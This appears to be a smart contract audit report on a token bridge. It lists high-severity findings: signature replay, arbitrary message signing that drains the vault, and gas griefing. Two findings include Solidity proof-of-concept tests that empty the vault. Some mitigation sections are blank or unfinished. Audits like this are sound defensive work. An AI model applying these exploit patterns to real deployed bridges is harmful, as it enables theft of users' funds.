# BOSS BRIDGE AUDIT REPORTS

# High

# [H-1] Signature replay attack at `L1BossBridge::sendToL1`

**Description:** Message signing do not contain single-use mechanism such `nonce` or `deadlines`. Hence, signatures can be used `n` number of times in order to execute `messages`.

**Impact:** Transfer signed by Signers can be executed by anyone effectively sending or withdrawing `n` number of times identical transaction as long as `L1BossBridge` owns or manages enough `L1Tokens` on `L1Vault`.

**Proof of Concept**

- Signatures are not one-usage and there's no mechanism from L1 to determine that user locked and unlocked tokens;

```javascript
   function testSignatureReplayAttacks() public {
        uint256 amount = 1 ether;

        uint256 vaultInitialBalance = 100e18;
        uint256 userInitialBalance = token.balanceOf(user);
        deal(address(token), address(vault), vaultInitialBalance);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(user, amount),
            operator.key
        );

        while (token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(user, amount, v, r, s);
        }

        uint256 userEndingBalance = token.balanceOf(user);
        uint256 vaultEndingBalance = token.balanceOf(address(vault));

        assertEq(userEndingBalance, vaultInitialBalance + userInitialBalance);
        assertEq(vaultEndingBalance, 0);
    }
```

**Recommended Mitigation**

- usage of nonces to enable one-usage signatures
- usage of deadlines to allow signature validity within a time range.

```diff
    function _getTokenWithdrawalMessage(
        address recipient,
        uint256 amount
    ) private view returns (bytes memory) {
+       nonce += 1;
        return
            abi.encode(
+               nonce,
                address(token), // target
                0, // value
                abi.encodeCall(
                    IERC20.transferFrom,
                    (address(vault), recipient, amount)
                ) // data
            );
    }
```

# [H-2] Any user is able to call `Bossbridge -> Vault::ApproveTo` to take control over an amount of tokens, in order to drain vault balance.

**Description:** There's no regulation about what kind of messages can be signed, it's just a request so as to get a valid signature to redeem L2 tokens into L1 `knowing that exists a valid Deposit event on L1`, users can leverage it to request signatures over any kind of message.

**Impact:** the following vulnerabilty catches the attention of malicious users due to the facility oo draining all funds in a vault.

**Proof of concept:**

```javascript

    function testMaliciousMessageSignatures() public {
        uint256 vaultInitialBalance = 100e18;
        deal(address(token), address(vault), vaultInitialBalance);

        address attacker = makeAddr("attacker");

        bytes memory message = abi.encode(
            address(vault),
            0,
            abi.encodeCall(vault.approveTo, (attacker, vaultInitialBalance))
        );

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

        tokenBridge.sendToL1(v, r, s, message);
        vm.prank(attacker);
        token.transferFrom(address(vault), attacker, vaultInitialBalance);

        uint256 attackerBalance = token.balanceOf(attacker);
        uint256 vaultEndingBalance = token.balanceOf(address(vault));

        assertEq(attackerBalance, vaultInitialBalance);
        assertEq(vaultEndingBalance, 0);
    }
```

**Recommened Mitigation:**

# [H-3] Users might charge with high gas consumption during a `Withdraw` to L1 from L2, making `BossBridge` to spend more ether in gas as the transfer occurs.

**Description:** while requesting withdraws, `BossBridge` has to perform a transfer from `Vault` to a recipient, this operation is an external call, recipients might implement complex logic on receiving tokens.
